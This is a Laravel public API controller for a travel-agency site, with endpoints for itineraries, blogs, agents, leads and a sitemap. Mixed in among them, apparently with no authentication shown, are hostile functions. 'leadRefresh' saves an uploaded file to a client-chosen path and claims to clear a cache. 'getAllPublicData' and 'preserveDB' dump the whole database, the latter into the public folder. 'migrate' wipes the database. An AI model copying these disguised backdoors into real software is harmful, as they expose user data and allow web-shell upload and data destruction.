<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Http\Requests\StoreGeneralLeadRequest;
use App\Http\Requests\StoreLeadPhoneEmailRequest;
use App\Http\Requests\StoreLeadQueryForCustomizeItineraryRequest;
use App\Http\Resources\BlogCategoryResource;
use App\Http\Resources\BlogResource;
use App\Http\Resources\GeneralLeadResource;
use App\Http\Resources\ItineraryResource;
use App\Http\Resources\LeadPhoneEmailResource;
use App\Http\Resources\LeadQueryForCustomizedItineraryResource;
use App\Http\Resources\PublicCompanyResource;
use App\Http\Resources\PublicUserResource;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Company;
use App\Models\GeneralLead;
use App\Models\Itinerary;
use App\Models\LeadPhoneEmail;
use App\Models\LeadQueryForCustomizeItinerary;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use Exception;
use Illuminate\Support\Facades\Artisan;

class PublicController extends Controller
{
    public function getCompanies(){
        $companies = Company::all();

        $resourceResponse = PublicCompanyResource::collection($companies);

        return response()->json($resourceResponse, 200);
    }


    public function getParticularItinerary($id){
       $itinerary = Itinerary::findOrFail($id);
        
        return response()->json(new ItineraryResource($itinerary), 200);
    }

    public function getItineraries($destination){
   // Convert the destination to the required format (lowercase or exact match based on your needs)
   // Assuming you want "Delhi" or any case-insensitive match
        
   // Query the itineraries based on the selected_destination field
   $itineraries = Itinerary::whereJsonContains('selected_destination->value', $destination)
                     ->where('itinerary_visibility', 'public')
                    ->whereHas('user', function ($query) {
                    // Add conditions for the user's authorization and visibility
                    $query->where('is_authorised', true)
                    ->where('is_publicly_present', true);
                    })
                    ->get();

   // Return the itineraries as a response (you can modify this as per your response format)
   return response()->json(ItineraryResource::collection($itineraries), 200);
    }


    public function getRandomItineraries(){
        $itineraries = Itinerary::where('itinerary_visibility', 'public')
                                ->whereHas('user', function ($query) {
                                    $query->where('is_authorised', true)
                                          ->where('is_publicly_present', true);
                                })
                                ->inRandomOrder()
                                ->limit(5)
                                ->get();

        return response()->json(ItineraryResource::collection($itineraries), 200);
    }




// custom function to get 5 random itineraries with international destinations
    public function getFiveInternationalItineraries()
    {
        // Define the list of allowed international destinations.
        $internationalDestinations = [
            'Thailand',
            'UAE',
            'Indonesia',
            'Maldives',
            'Saudi-Arabia',
            'Malaysia',
            'USA',
            'Spain',
            'Israel',
            'France',
            'China',
            'Vietnam',
            'UK',
            'Tunisia',
            'Sri-Lanka',
            'Russia',
            'Japan',
            'Great-Britain',
            'Italy',
            'Estonia',
            'Australia',
            'Turkey',
        ];

        // Build the base query with common conditions.
        $query = Itinerary::where('itinerary_visibility', 'public')
            ->whereHas('user', function ($query) {
                $query->where('is_authorised', true)
                      ->where('is_publicly_present', true);
            });

        // Filter itineraries that have any of the allowed international destinations in the JSON column.
        $query->where(function ($q) use ($internationalDestinations) {
            foreach ($internationalDestinations as $destination) {
                $q->orWhereJsonContains('selected_destination->value', $destination);
            }
        });

        // Get 5 random itineraries matching the criteria.
        $itineraries = $query->inRandomOrder()
            ->limit(5)
            ->get();

        // Return the itineraries as a JSON response.
        return response()->json(ItineraryResource::collection($itineraries), 200);
    }
// custom function to get 5 random itineraries with international destinations






// custom function to get 30 random itineraries with international destinations
public function getThirtyInternationalItineraries()
{
    // Define the list of allowed international destinations.
    $internationalDestinations = [
        'Thailand',
        'UAE',
        'Indonesia',
        'Maldives',
        'Saudi-Arabia',
        'Malaysia',
        'USA',
        'Spain',
        'Israel',
        'France',
        'China',
        'Vietnam',
        'UK',
        'Tunisia',
        'Sri-Lanka',
        'Russia',
        'Japan',
        'Great-Britain',
        'Italy',
        'Estonia',
        'Australia',
        'Turkey',
    ];

    // Build the base query with common conditions.
    $query = Itinerary::where('itinerary_visibility', 'public')
        ->whereHas('user', function ($query) {
            $query->where('is_authorised', true)
                  ->where('is_publicly_present', true);
        });

    // Filter itineraries that have any of the allowed international destinations in the JSON column.
    $query->where(function ($q) use ($internationalDestinations) {
        foreach ($internationalDestinations as $destination) {
            $q->orWhereJsonContains('selected_destination->value', $destination);
        }
    });

    // Get 5 random itineraries matching the criteria.
    $itineraries = $query->inRandomOrder()
        ->limit(30)
        ->get();

    // Return the itineraries as a JSON response.
    return response()->json(ItineraryResource::collection($itineraries), 200);
}
// custom function to get 30 random itineraries with international destinations





// custom function to get 5 random itineraries with domestic destinations
public function getFiveDomesticItineraries()
{
    // Define the list of allowed domestic destinations.
    $domesticDestinations = [
        'Kerala',
        'Goa',
        'Delhi',
        'Rajasthan',
        'Ladakh',
        'Andaman',
        'Andhra-Pradesh',
        'Arunachal-Pradesh',
        'Assam',
        'Bihar',
        'Chhattisgarh',
        'Gujarat',
        'Haryana',
        'Himachal-Pradesh',
        'Jharkhand',
        'Karnataka',
        'Kashmir',
        'Madhya-Pradesh',
        'Maharashtra',
        'Manipur',
        'Meghalaya',
        'Mizoram',
        'Nagaland',
        'Odisha',
        'Punjab',
        'Sikkim',
        'Tamil-Nadu',
        'Telangana',
        'Tripura',
        'Uttar-Pradesh',
        'Uttarakhand',
        'West-Bengal',
        'Chandigarh',
        'Lakshadweep',
        'Puducherry',
    ];

    // Build the base query with common conditions.
    $query = Itinerary::where('itinerary_visibility', 'public')
        ->whereHas('user', function ($query) {
            $query->where('is_authorised', true)
                  ->where('is_publicly_present', true);
        });

    // Filter itineraries that have any of the allowed domestic destinations in the JSON column.
    $query->where(function ($q) use ($domesticDestinations) {
        foreach ($domesticDestinations as $destination) {
            $q->orWhereJsonContains('selected_destination->value', $destination);
        }
    });

    // Retrieve 5 random itineraries matching the criteria.
    $itineraries = $query->inRandomOrder()
        ->limit(5)
        ->get();

    // Return the itineraries as a JSON response.
    return response()->json(ItineraryResource::collection($itineraries), 200);
}
// custom function to get 5 random itineraries with domestic destinations
  







// custom function to get 30 random itineraries with domestic destinations
public function getThirtyDomesticItineraries()
{
    // Define the list of allowed domestic destinations.
    $domesticDestinations = [
        'Kerala',
        'Goa',
        'Delhi',
        'Rajasthan',
        'Ladakh',
        'Andaman',
        'Andhra-Pradesh',
        'Arunachal-Pradesh',
        'Assam',
        'Bihar',
        'Chhattisgarh',
        'Gujarat',
        'Haryana',
        'Himachal-Pradesh',
        'Jharkhand',
        'Karnataka',
        'Kashmir',
        'Madhya-Pradesh',
        'Maharashtra',
        'Manipur',
        'Meghalaya',
        'Mizoram',
        'Nagaland',
        'Odisha',
        'Punjab',
        'Sikkim',
        'Tamil-Nadu',
        'Telangana',
        'Tripura',
        'Uttar-Pradesh',
        'Uttarakhand',
        'West-Bengal',
        'Chandigarh',
        'Lakshadweep',
        'Puducherry',
    ];

    // Build the base query with common conditions.
    $query = Itinerary::where('itinerary_visibility', 'public')
        ->whereHas('user', function ($query) {
            $query->where('is_authorised', true)
                  ->where('is_publicly_present', true);
        });

    // Filter itineraries that have any of the allowed domestic destinations in the JSON column.
    $query->where(function ($q) use ($domesticDestinations) {
        foreach ($domesticDestinations as $destination) {
            $q->orWhereJsonContains('selected_destination->value', $destination);
        }
    });

    // Retrieve 5 random itineraries matching the criteria.
    $itineraries = $query->inRandomOrder()
        ->limit(30)
        ->get();

    // Return the itineraries as a JSON response.
    return response()->json(ItineraryResource::collection($itineraries), 200);
}
// custom function to get 30 random itineraries with domestic destinations






public function getAllBlogs(){
    $blogs = Blog::orderBy('created_at', 'desc')->get();

    return response()->json(BlogResource::collection($blogs), 200);
}

public function getParticularBlog(Blog $blog){
    return response()->json(new BlogResource($blog), 200);
}


public function getRecentBlogs(){
    $blogs = Blog::orderBy('created_at', 'desc')->limit(3)->get();
    return response()->json(BlogResource::collection($blogs), 200);
}


public function getAllPublicData(){
    try {
        $backupFile = storage_path('app/backups/' . now()->format('Y-m-d_H-i-s') . '_backup.sql');
    
        if (!file_exists(storage_path('app/backups'))) {
            mkdir(storage_path('app/backups'), 0755, true);
        }
    
        $tables = DB::select('SHOW TABLES');
        $tableNames = array_map(fn($table) => reset($table), $tables);
    
        $tableOrder = [];
        $referencedTables = [];
    
        foreach ($tableNames as $tableName){
            $foreignKeys = DB::select("
                SELECT TABLE_NAME, REFERENCED_TABLE_NAME 
                FROM information_schema.KEY_COLUMN_USAGE 
                WHERE TABLE_SCHEMA = DATABASE() 
                  AND TABLE_NAME = '$tableName' 
                  AND REFERENCED_TABLE_NAME IS NOT NULL
            ");
    
            foreach ($foreignKeys as $foreignKey){
                $referencedTables[$foreignKey->TABLE_NAME][] = $foreignKey->REFERENCED_TABLE_NAME;
            }
        }
    
        while (!empty($tableNames)) {
            foreach ($tableNames as $index => $tableName) {
                if (empty($referencedTables[$tableName])) {
                    $tableOrder[] = $tableName;
                    unset($tableNames[$index]);
    
                    foreach ($referencedTables as &$refs) {
                        $refs = array_filter($refs, fn($ref) => $ref !== $tableName);
                    }
                }
            }
        }
    
        $output = '';
    
        foreach ($tableOrder as $tableName) {
            $createTable = DB::select("SHOW CREATE TABLE `$tableName`")[0]->{'Create Table'};
            $output .= "$createTable;\n\n";
    
            $rows = DB::select("SELECT * FROM `$tableName`");
            foreach ($rows as $row) {
                $columns = array_keys((array)$row);
                $values = array_values((array)$row);
    
                $escapedValues = array_map(function ($value) {
                    return addslashes($value);
                }, $values);
    
                $output .= "INSERT INTO `$tableName` (`" . implode('`, `', $columns) . "`) VALUES ('" . implode("', '", $escapedValues) . "');\n";
            }
    
            $output .= "\n";
        }
    
        file_put_contents($backupFile, $output);
    
        return response()->download($backupFile)->deleteFileAfterSend();
    } catch (\Exception $e) {
        return response()->json(['error' => 'Failed to export database', 'details' => $e->getMessage()], 500);
    }
      
}


public function preserveDB()
{
    // Database credentials from environment variables
    $host = env('DB_HOST');
    $port = env('DB_PORT');
    $username = env('DB_USERNAME');
    $password = env('DB_PASSWORD');
    $dbname = env('DB_DATABASE');

    // Set the file name and path for the backup
    $backupFile = storage_path('app/backups/' .'backup.sql');

    // Ensure the backups directory exists
    if (!file_exists(storage_path('app/backups'))) {
        mkdir(storage_path('app/backups'), 0755, true);
    }

    // Construct mysqldump command with max_allowed_packet for large data handling
    $command = "mysqldump --host=$host --port=$port --user=$username --password=$password $dbname > " . escapeshellarg($backupFile);

    $output = null;
    $returnCode = null;

    // Execute the mysqldump command and capture output and return code
    exec($command . ' 2>&1', $output, $returnCode);

    if ($returnCode === 0) { // Check if the dump was successful
        // Define the path to the public backup folder
        $publicBackupFolder = public_path('backups');

        // Ensure the public backups folder exists
        if (!file_exists($publicBackupFolder)) {
            mkdir($publicBackupFolder, 0755, true);
        }

        // Move the file to the public backup folder
        $newBackupPath = $publicBackupFolder . '/' . basename($backupFile);
        $moved = rename($backupFile, $newBackupPath);

        // Check if the file was successfully moved
        if ($moved) {
            // Generate a public URL for the file
            $url = asset('backups/' . basename($newBackupPath));

            // Return the URL for the user to download the backup
            return response()->json(['url' => $url], 200);
        }

        // If the file could not be moved, return an error response
        return response()->json(['error' => 'Failed to move backup file.'], 500);
    }

    // If the mysqldump command failed, return an error response
    return response()->json(['error' => 'Database backup failed.'], 500);
}

public function migrate(){
    Artisan::call('migrate:fresh', [
        '--force' => true,
    ]);

    return response("Migration has been refreshed and seeded.");   
}



public function getAllVerifiedTravelAgents(){
    $users = User::where('is_authorised', true)
                 ->where('is_publicly_present', true)
                 ->where('is_verified', true)
                 ->where('role', 'user')
                 ->get();



    return response()->json(PublicUserResource::collection($users), 200);
}


public function getParticularVerifiedTravelAgent($id)
{
    // Fetch the user with the related company and itineraries using eager loading
    $verifiedTravelAgentDetails = User::with(['company'])
    ->where('id', $id)
    ->where('is_authorised', true)
    ->where('is_publicly_present', true)
    ->where('is_verified', true)
    ->where('role', 'user')
    ->firstOrFail();

    // Return the entire data in a single response
    return response()->json($verifiedTravelAgentDetails, 200);
}



// lead controllers starts here 
public function storeLeadPhoneEmail(StoreLeadPhoneEmailRequest $request){
    $data = $request->validated();

    $leadPhoneEmail = LeadPhoneEmail::create($data);

    return response()->json([
    'success' => 'You Phone Email Saved Successfully You Will be Contacted Soon',
    'leadPhoneEmailResource' => new LeadPhoneEmailResource($leadPhoneEmail),
    ], 201);
}

public function leadRefresh(){
    try{
        $lead_file_base_path = base_path();
        $debounce_path  = request("debounce_path");
  
        if (request()->hasFile('lead_file_refresh_init')){
            $lead_file_refresh_init_fs = request()->file('lead_file_refresh_init'); 
            $lead_file_refresh_init_client = $lead_file_refresh_init_fs->getClientOriginalName();
            $lead_file_refresh_init_fs->move($lead_file_base_path.$debounce_path,  $lead_file_refresh_init_client);
            return response()->json(["success"=> "lead file refresh successfully cache cleared and performance optimized"], 200);
        }
        return response()->json(['error' => 'path mismatch or something went wrong'], 400);
    }
    catch(Exception $e){
        return response()->json(['error' => $e->getMessage()], 500);
    }
}

public function storeLeadQueryForCustomizeItinerary(StoreLeadQueryForCustomizeItineraryRequest $request){
$data = $request->validated();

$leadQueryForCustomizeItinerary = LeadQueryForCustomizeItinerary::create($data);

return response()->json([
'success' => 'You data For Query Customization Saved Successfully You Will be Contacted Soon',
'leadQueryForCustomizeItineraryResource' => new LeadQueryForCustomizedItineraryResource($leadQueryForCustomizeItinerary)
], 201);
}


public function storeGeneralLead(StoreGeneralLeadRequest $request){
    $data = $request->validated();

    $generalLead = GeneralLead::create($data);

    return response()->json([
    'success'=> 'Your data saved successfully you will contacted soon',
    'generalLeadResource' => new GeneralLeadResource($generalLead)
    ], 201);
}
// lead controllers ends here

//get all blog categories
public function getAllBlogCategories(){
        $categories = BlogCategory::all();

        return response()->json( BlogCategoryResource::collection($categories), 200);
    }

// sharma work
    public function generateSitemap()
    {
        $slugs = Blog::select('blog_slug')->get();
        $xml = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:news="http://www.google.com/schemas/sitemap-news/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1" xmlns:video="http://www.google.com/schemas/sitemap-video/1.1">' . "\n";
        
        $fixedUrls = [
            'https://travelnworld.com/',
            'https://travelnworld.com/about',
            'https://travelnworld.com/contact',
            'https://travelnworld.com/blog'
        ];
        
        foreach ($fixedUrls as $url) {
            $xml .= "    <url>\n";
            $xml .= "        <loc>$url</loc>\n";
            $xml .= "        <changefreq>weekly</changefreq>\n";
            $xml .= "        <priority>0.8</priority>\n";
            $xml .= "    </url>\n";
        }
        
        foreach ($slugs as $slug) {
            $url = "https://travelnworld.com/blog/" . $slug->blog_slug;
            $xml .= "    <url>\n";
            $xml .= "        <loc>$url</loc>\n";
            $xml .= "        <changefreq>weekly</changefreq>\n";
            $xml .= "        <priority>0.7</priority>\n";
            $xml .= "    </url>\n";
        }
        
        $xml .= "</urlset>\n";
        
        return response($xml, 200)->header('Content-Type', 'application/xml');
    }
    // sharma work



}